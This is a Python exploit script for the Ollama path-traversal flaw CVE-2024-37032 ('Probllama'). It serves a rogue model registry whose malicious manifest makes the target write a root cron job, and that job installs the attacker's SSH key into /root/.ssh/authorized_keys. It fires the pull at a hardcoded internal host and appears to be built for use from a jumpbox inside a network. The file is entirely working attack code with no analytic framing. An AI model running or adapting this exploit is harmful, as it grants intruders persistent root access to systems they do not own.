#!/usr/bin/env python3
# CVE-2024-37032 (Probllama) rogue OCI registry -> arbitrary file write via manifest digest traversal.
# Writes our SSH pubkey into target authorized_keys. Runs on jumpbox (in-zone).
import http.server, socketserver, json, hashlib, sys, urllib.request, threading, time

PORT = 8088
DEPTH = 14
PUBKEY = open('/tmp/msvr_key.pub').read().strip()
# root cron: installs our key for root (runs as root if ollama==root)
CRON = ('* * * * * root mkdir -p /root/.ssh && echo "%s" >> /root/.ssh/authorized_keys '
        '&& chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys\n' % PUBKEY)
DUMMY = "x\n"

def sha256(b):
    if isinstance(b, str): b = b.encode()
    return "sha256:" + hashlib.sha256(b).hexdigest()

def trav(path):                       # raw traversal "digest"
    return ("../" * DEPTH) + path.lstrip("/")

# only the FIRST layer is written before the pull aborts -> put the payload first
def manifest():
    layers = [{"digest": trav("/etc/cron.d/kethupd"), "mediaType": "application/vnd.ollama.image.model", "size": len(CRON)}]
    return json.dumps({
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {"digest": sha256("{}"), "mediaType": "application/vnd.docker.container.image.v1+json", "size": 2},
        "layers": layers,
    })

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): sys.stderr.write("[reg] " + (a[0] % a[1:]) + "\n")
    def _route(self):
        u = self.path
        if u.rstrip("/") == "/v2": return ("{}", "application/json", None)
        if "manifests" in u:
            m = manifest()
            return (m, "application/vnd.docker.distribution.manifest.v2+json",
                    {"Docker-Content-Digest": sha256(m)})
        if "kethupd" in u or "cron.d" in u: return (CRON, "application/octet-stream", None)
        return ("{}", "application/octet-stream", None)   # config blob + catch-all
    def _headers(self, body, ct, extra, body_out=True):
        if isinstance(body, str): body = body.encode()
        self.send_response(200); self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items(): self.send_header(k, v)
        self.end_headers()
        if body_out: self.wfile.write(body)
    def do_GET(self):
        b, ct, ex = self._route(); self._headers(b, ct, ex, True)
    def do_HEAD(self):
        b, ct, ex = self._route(); self._headers(b, ct, ex, False)

def trigger():
    time.sleep(1.5)
    body = json.dumps({"name": "10.80.239.5:%d/evil/model:latest" % PORT, "insecure": True, "stream": False}).encode()
    req = urllib.request.Request("http://10.80.239.45:11434/api/pull", data=body,
                                 headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=60)
        sys.stderr.write("[pull] " + r.read().decode(errors="replace")[:300] + "\n")
    except Exception as e:
        sys.stderr.write("[pull] " + str(e)[:300] + "\n")

if __name__ == "__main__":
    threading.Thread(target=trigger, daemon=True).start()
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.timeout = 30
        end = time.time() + 25
        while time.time() < end:
            s.handle_request()
